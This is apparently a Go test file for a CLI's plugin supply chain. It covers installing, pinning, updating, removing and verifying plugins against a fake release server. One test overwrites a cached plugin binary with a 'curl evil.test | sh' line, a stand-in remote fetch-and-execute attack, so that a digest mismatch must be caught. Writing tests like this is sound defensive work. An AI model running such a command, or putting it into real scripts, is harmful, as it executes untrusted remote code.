package cli

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/spf13/cobra"

	"github.com/setthasit/Lore/internal/plugindist"
	"github.com/setthasit/Lore/internal/registry"
	"github.com/setthasit/Lore/sdk"
)

// pluginStub is a binary that is NOT a plugin: it answers nothing on the
// protocol. Installing it is legal — the supply chain checks bytes, not
// behavior — and certifying it is what refuses it.
const pluginStub = "#!/bin/sh\necho lore-linear\n"

// The Python fixture is a real plugin, so `lore plugin verify` runs the same
// certification suite against it that the official plugins run under `go test`
// and the command is exercised end to end rather than up to the handshake.
func pythonPlugin(t *testing.T) string {
	t.Helper()

	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("python3 is not on PATH, so the external plugin fixture cannot run")
	}

	body, err := os.ReadFile(filepath.Join("..", "..", "..", "test", "fixtures", "plugins", "pysource.py"))
	if err != nil {
		t.Fatalf("read the fixture plugin: %v", err)
	}
	return string(body)
}

// The plugin supply chain is faked whole: these tests never reach GitHub and
// never write to a real home.
type fakeReleases struct {
	t      *testing.T
	tags   map[string]map[string][]byte
	latest string
	server *httptest.Server
}

func newFakeReleases(t *testing.T) *fakeReleases {
	t.Helper()

	fake := &fakeReleases{t: t, tags: map[string]map[string][]byte{}}
	fake.server = httptest.NewServer(http.HandlerFunc(fake.serve))
	t.Cleanup(fake.server.Close)

	t.Setenv(plugindist.APIBaseEnv, fake.server.URL)
	t.Setenv(plugindist.RootEnv, filepath.Join(t.TempDir(), "home"))
	return fake
}

func (f *fakeReleases) publish(tag string, body string) {
	f.t.Helper()

	assets := map[string][]byte{assetName(tag): pluginArchive(f.t, body)}
	assets[plugindist.ChecksumsAsset] = pluginChecksums(assets)
	f.tags[tag], f.latest = assets, tag
}

func (f *fakeReleases) digest(tag string) string {
	f.t.Helper()

	sum := sha256.Sum256(f.tags[tag][assetName(tag)])
	return "sha256:" + hex.EncodeToString(sum[:])
}

func (f *fakeReleases) serve(w http.ResponseWriter, r *http.Request) {
	const prefix = "/repos/jdoe/lore-linear/releases/"

	tag := ""
	switch {
	case r.URL.Path == prefix+"latest":
		tag = f.latest
	case strings.HasPrefix(r.URL.Path, prefix+"tags/"):
		tag = strings.TrimPrefix(r.URL.Path, prefix+"tags/")
	case strings.HasPrefix(r.URL.Path, "/download/"):
		segments := strings.SplitN(strings.TrimPrefix(r.URL.Path, "/download/"), "/", 2)
		if len(segments) == 2 {
			if body, published := f.tags[segments[0]][segments[1]]; published {
				_, _ = w.Write(body)
				return
			}
		}
		http.NotFound(w, r)
		return
	default:
		http.NotFound(w, r)
		return
	}

	assets, published := f.tags[tag]
	if !published {
		http.Error(w, `{"message":"Not Found"}`, http.StatusNotFound)
		return
	}

	type asset struct {
		Name string `json:"name"`
		URL  string `json:"browser_download_url"`
	}
	body := struct {
		TagName string  `json:"tag_name"`
		Assets  []asset `json:"assets"`
	}{TagName: tag}
	for name := range assets {
		body.Assets = append(body.Assets, asset{Name: name, URL: f.server.URL + "/download/" + tag + "/" + name})
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(body)
}

func assetName(tag string) string {
	return "lore-linear_" + strings.TrimPrefix(tag, "v") + "_" + runtime.GOOS + "_" + runtime.GOARCH + ".tar.gz"
}

func pluginBinaryName() string {
	if runtime.GOOS == "windows" {
		return "lore-linear.exe"
	}
	return "lore-linear"
}

func pluginArchive(t *testing.T, body string) []byte {
	t.Helper()

	var buffer bytes.Buffer
	compressor := gzip.NewWriter(&buffer)
	writer := tar.NewWriter(compressor)

	header := &tar.Header{
		Typeflag: tar.TypeReg, Name: pluginBinaryName(),
		Mode: 0o755, Size: int64(len(body)),
	}
	if err := writer.WriteHeader(header); err != nil {
		t.Fatalf("write tar header: %v", err)
	}
	if _, err := writer.Write([]byte(body)); err != nil {
		t.Fatalf("write tar body: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("close tar: %v", err)
	}
	if err := compressor.Close(); err != nil {
		t.Fatalf("close gzip: %v", err)
	}
	return buffer.Bytes()
}

func pluginChecksums(assets map[string][]byte) []byte {
	var lines strings.Builder
	for name, body := range assets {
		sum := sha256.Sum256(body)
		lines.WriteString(hex.EncodeToString(sum[:]) + "  " + name + "\n")
	}
	return []byte(lines.String())
}

// runPluginDist drives the four commands this file owns. They are wired into
// `lore plugin` by the composition root, which is another file's business, so
// the test builds the smallest root that can reach them.
func runPluginDist(t *testing.T, args ...string) result {
	t.Helper()

	configPath := new(string)
	root := &cobra.Command{Use: "lore", SilenceUsage: true, SilenceErrors: true}
	root.PersistentFlags().StringVar(configPath, "config", defaultConfigPath, "path to lore.yaml")

	plugin := &cobra.Command{Use: "plugin"}
	plugin.AddCommand(
		newPluginInstallCommand(configPath),
		newPluginUpdateCommand(configPath),
		newPluginRemoveCommand(configPath),
		newPluginVerifyCommand(configPath, registry.New(lore.Host{})),
	)
	root.AddCommand(plugin)

	var out, errOut bytes.Buffer
	root.SetOut(&out)
	root.SetErr(&errOut)
	root.SetArgs(args)

	res := result{}
	if err := root.ExecuteContext(context.Background()); err != nil {
		res.exitCode = report(&errOut, err)
	}
	res.stdout, res.stderr = out.String(), errOut.String()
	return res
}

func writePluginConfig(t *testing.T, body string) string {
	t.Helper()

	path := filepath.Join(t.TempDir(), "lore.yaml")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatalf("seed a configuration: %v", err)
	}
	return path
}

func declaredConfig(from string) string {
	return "workspace: myproject\n\nplugins:\n  - name: linear\n    from: " + from + "\n"
}

func readWorkspaceFile(t *testing.T, path string) string {
	t.Helper()

	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	return string(body)
}

func lockFile(t *testing.T, configPath string) string {
	t.Helper()

	return readWorkspaceFile(t, filepath.Join(filepath.Dir(configPath), plugindist.LockFileName))
}

func TestPluginInstallPinsAndLocksADeclaredPlugin(t *testing.T) {
	fake := newFakeReleases(t)
	fake.publish("v0.3.1", pluginStub)
	path := writePluginConfig(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	res := runPluginDist(t, "plugin", "install", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	// Installing a plugin runs that author's code, and the CLI says so at the
	// moment the user chooses to.
	if !strings.Contains(res.stdout, "runs that author's code on this machine") {
		t.Fatalf("stdout %q does not state what installing means", res.stdout)
	}
	if !strings.Contains(res.stdout, "installed plugins[linear] v0.3.1") {
		t.Fatalf("stdout %q does not report the install", res.stdout)
	}

	lock := lockFile(t, path)
	for _, want := range []string{"version: 1", "linear:", "version: v0.3.1", fake.digest("v0.3.1")} {
		if !strings.Contains(lock, want) {
			t.Fatalf("lore.lock %q does not contain %q", lock, want)
		}
	}
	if config := readWorkspaceFile(t, path); config != declaredConfig("github.com/jdoe/lore-linear@v0.3.1") {
		t.Fatalf("install rewrote a pinned configuration:\n%s", config)
	}
}

// @latest is legal as an argument and illegal in a file, so install resolves it
// and writes the concrete version back.
func TestPluginInstallLatestWritesTheVersionBack(t *testing.T) {
	fake := newFakeReleases(t)
	fake.publish("v0.3.1", pluginStub)
	fake.publish("v0.4.0", pluginStub+"# v0.4.0\n")
	path := writePluginConfig(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	res := runPluginDist(t, "plugin", "install", "linear@latest", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	if config := readWorkspaceFile(t, path); config != declaredConfig("github.com/jdoe/lore-linear@v0.4.0") {
		t.Fatalf("configuration =\n%s\nwant the pinned v0.4.0", config)
	}
	if lock := lockFile(t, path); !strings.Contains(lock, "version: v0.4.0") ||
		!strings.Contains(lock, fake.digest("v0.4.0")) {
		t.Fatalf("lore.lock does not pin v0.4.0:\n%s", lock)
	}
}

// A floating version in lore.yaml is refused before anything is downloaded.
func TestPluginInstallRefusesAFloatingConfiguration(t *testing.T) {
	newFakeReleases(t)
	path := writePluginConfig(t, declaredConfig("github.com/jdoe/lore-linear@latest"))

	res := runPluginDist(t, "plugin", "install", "--config", path)
	if res.exitCode != exitBadRequest {
		t.Fatalf("exit = %d, want %d; stderr = %q", res.exitCode, exitBadRequest, res.stderr)
	}
	if !strings.Contains(res.stderr, "lore plugin install linear@latest") {
		t.Fatalf("stderr %q does not name the command that pins it", res.stderr)
	}
	if _, err := os.Stat(filepath.Join(filepath.Dir(path), plugindist.LockFileName)); !os.IsNotExist(err) {
		t.Fatal("a refused install wrote lore.lock")
	}
}

func TestPluginInstallUnresolvableCoordinateWritesNoLock(t *testing.T) {
	fake := newFakeReleases(t)
	fake.publish("v0.3.1", pluginStub)
	declared := declaredConfig("github.com/jdoe/lore-linear@v9.9.9")
	path := writePluginConfig(t, declared)

	res := runPluginDist(t, "plugin", "install", "--config", path)
	if res.exitCode == exitOK {
		t.Fatalf("installing an unknown tag succeeded: %q", res.stdout)
	}
	if !strings.Contains(res.stderr, "github.com/jdoe/lore-linear@v9.9.9") {
		t.Fatalf("stderr %q does not name the coordinate", res.stderr)
	}
	if _, err := os.Stat(filepath.Join(filepath.Dir(path), plugindist.LockFileName)); !os.IsNotExist(err) {
		t.Fatal("an aborted install wrote lore.lock")
	}
	if config := readWorkspaceFile(t, path); config != declared {
		t.Fatalf("an aborted install rewrote the configuration:\n%s", config)
	}
}

// A coordinate argument for a plugin nobody declared yet declares it, because
// the declaration is what every `use:` refers to afterwards.
func TestPluginInstallCoordinateDeclaresThePlugin(t *testing.T) {
	fake := newFakeReleases(t)
	fake.publish("v0.3.1", pluginStub)
	path := writePluginConfig(t, "workspace: myproject\n")

	res := runPluginDist(t, "plugin", "install", "github.com/jdoe/lore-linear@v0.3.1", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	const want = "workspace: myproject\nplugins:\n  - name: linear\n    from: github.com/jdoe/lore-linear@v0.3.1\n"
	if config := readWorkspaceFile(t, path); config != want {
		t.Fatalf("configuration =\n%s\nwant\n%s", config, want)
	}
	if lock := lockFile(t, path); !strings.Contains(lock, "linear:") {
		t.Fatalf("lore.lock does not declare the plugin:\n%s", lock)
	}
}

func TestPluginVerifyReportsTheDigestAndCertifiesTheBinary(t *testing.T) {
	fake := newFakeReleases(t)
	fake.publish("v0.3.1", pythonPlugin(t))
	path := writePluginConfig(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	if res := runPluginDist(t, "plugin", "install", "--config", path); res.exitCode != exitOK {
		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	res := runPluginDist(t, "plugin", "verify", "linear", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}
	for _, want := range []string{
		"plugins[linear] v0.3.1",
		"re-checked now",
		fake.digest("v0.3.1"),
		filepath.Join("plugins", "linear", "v0.3.1", pluginBinaryName()),
		"conformance: passed",
	} {
		if !strings.Contains(res.stdout, want) {
			t.Fatalf("stdout %q does not mention %q", res.stdout, want)
		}
	}
}

// The digest proves the bytes are the ones that were published; it says nothing
// about whether they implement the contract. Certification is what closes that
// gap, so a binary that answers nothing on the protocol is refused even though
// its digest is perfect.
func TestPluginVerifyRefusesABinaryThatIsNotAPlugin(t *testing.T) {
	fake := newFakeReleases(t)
	fake.publish("v0.3.1", pluginStub)
	path := writePluginConfig(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	if res := runPluginDist(t, "plugin", "install", "--config", path); res.exitCode != exitOK {
		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	res := runPluginDist(t, "plugin", "verify", "linear", "--config", path)
	if res.exitCode == exitOK {
		t.Fatalf("exit = %d, want a refusal; stdout = %q", res.exitCode, res.stdout)
	}
	// The digest report still precedes the refusal: which check failed is the
	// whole diagnostic value of the command.
	if !strings.Contains(res.stdout, fake.digest("v0.3.1")) {
		t.Errorf("stdout %q does not report the digest it verified", res.stdout)
	}
}

// A cached binary rewritten after installation is caught at verify, and would
// be caught the same way at startup: the digest is re-checked, never trusted.
func TestPluginVerifyRefusesARewrittenCachedBinary(t *testing.T) {
	fake := newFakeReleases(t)
	fake.publish("v0.3.1", pluginStub)
	path := writePluginConfig(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	if res := runPluginDist(t, "plugin", "install", "--config", path); res.exitCode != exitOK {
		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	binary := filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear", "v0.3.1", pluginBinaryName())
	if err := os.WriteFile(binary, []byte("#!/bin/sh\ncurl evil.test | sh\n"), 0o755); err != nil {
		t.Fatalf("rewrite the cached binary: %v", err)
	}

	res := runPluginDist(t, "plugin", "verify", "linear", "--config", path)
	if res.exitCode != exitPrecondition {
		t.Fatalf("exit = %d, want %d; stdout = %q", res.exitCode, exitPrecondition, res.stdout)
	}
	if !strings.Contains(res.stderr, "digest mismatch") {
		t.Fatalf("stderr %q does not report a digest mismatch", res.stderr)
	}
}

func TestPluginUpdateRewritesTheLockedDigest(t *testing.T) {
	fake := newFakeReleases(t)
	fake.publish("v0.3.1", pluginStub)
	path := writePluginConfig(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	if res := runPluginDist(t, "plugin", "install", "--config", path); res.exitCode != exitOK {
		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}
	fake.publish("v0.4.0", pluginStub+"# v0.4.0\n")

	res := runPluginDist(t, "plugin", "update", "linear", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	if config := readWorkspaceFile(t, path); config != declaredConfig("github.com/jdoe/lore-linear@v0.4.0") {
		t.Fatalf("configuration =\n%s\nwant v0.4.0", config)
	}
	lock := lockFile(t, path)
	if !strings.Contains(lock, fake.digest("v0.4.0")) {
		t.Fatalf("lore.lock does not carry the new digest:\n%s", lock)
	}
	if strings.Contains(lock, fake.digest("v0.3.1")) {
		t.Fatalf("lore.lock still carries the old digest:\n%s", lock)
	}
}

func TestPluginRemoveDropsTheDeclarationLockAndCache(t *testing.T) {
	fake := newFakeReleases(t)
	fake.publish("v0.3.1", pluginStub)
	path := writePluginConfig(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))

	if res := runPluginDist(t, "plugin", "install", "--config", path); res.exitCode != exitOK {
		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	res := runPluginDist(t, "plugin", "remove", "linear", "--config", path)
	if res.exitCode != exitOK {
		t.Fatalf("exit = %d, stderr = %q", res.exitCode, res.stderr)
	}

	if config := readWorkspaceFile(t, path); config != "workspace: myproject\n\n" {
		t.Fatalf("configuration =\n%q\nwant the declaration gone", config)
	}
	if lock := lockFile(t, path); strings.Contains(lock, "linear") {
		t.Fatalf("lore.lock still holds the plugin:\n%s", lock)
	}
	if _, err := os.Stat(filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear")); !os.IsNotExist(err) {
		t.Fatal("the cached versions survived a removal")
	}
}

// Removing a plugin an instance still names would write a configuration the
// next command cannot load, so it is refused with what is in the way.
func TestPluginRemoveRefusesWhileAnInstanceUsesIt(t *testing.T) {
	newFakeReleases(t)
	declared := declaredConfig("github.com/jdoe/lore-linear@v0.3.1") +
		"\nsources:\n  - use: linear\n    with:\n      team: PLATFORM\n"
	path := writePluginConfig(t, declared)

	res := runPluginDist(t, "plugin", "remove", "linear", "--config", path)
	if res.exitCode != exitPrecondition {
		t.Fatalf("exit = %d, want %d; stdout = %q", res.exitCode, exitPrecondition, res.stdout)
	}
	if !strings.Contains(res.stderr, "sources[linear]") {
		t.Fatalf("stderr %q does not name what still uses it", res.stderr)
	}
	if config := readWorkspaceFile(t, path); config != declared {
		t.Fatalf("a refused removal rewrote the configuration:\n%s", config)
	}
}
